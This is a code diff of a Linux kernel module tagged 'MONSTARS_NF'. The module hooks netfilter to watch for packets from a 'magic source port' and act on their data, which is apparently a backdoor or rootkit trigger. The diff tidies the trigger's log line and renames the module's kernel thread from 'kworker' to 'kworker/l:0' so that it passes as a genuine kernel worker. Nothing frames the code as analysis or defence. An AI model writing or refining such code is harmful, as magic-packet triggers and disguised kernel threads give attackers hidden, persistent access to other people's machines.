@@ -83,7 +83,7 @@ unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const st
 {
     unsigned int retval = NF_ACCEPT;
     struct iphdr *iph = NULL;
-    struct tcphdr *tcph = NULL;
+    // struct tcphdr *tcph = NULL;
     struct udphdr *udph = NULL;
     unsigned short src_port = 0;
     unsigned short dst_port = 0;
@@ -120,8 +120,7 @@ unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const st
             // look for magic source port
             if (MAGIC_SRC_PORT == src_port)
             {
-                KERNEL_LOG("MONSTARS_NF : Magic %s %pI4:%d --> %pI4:%d\n",
-                        (tcph ? "TCP" : "UDP"),
+                KERNEL_LOG("MONSTARS_NF : Magic packet %pI4:%d --> %pI4:%d\n",
                         &iph->saddr, src_port, &iph->daddr, dst_port);
                 if (NULL != data)
                 {
@@ -214,7 +213,7 @@ int __init init_module()
     }
 
     // kthread worker
-    s_kthread = kthread_run(task_thread, NULL, "kworker");
+    s_kthread = kthread_run(task_thread, NULL, "kworker/l:0");
     if (NULL == s_kthread)
     {
         KERNEL_LOG("MONSTARS_NF : Error starting kthread!\n");
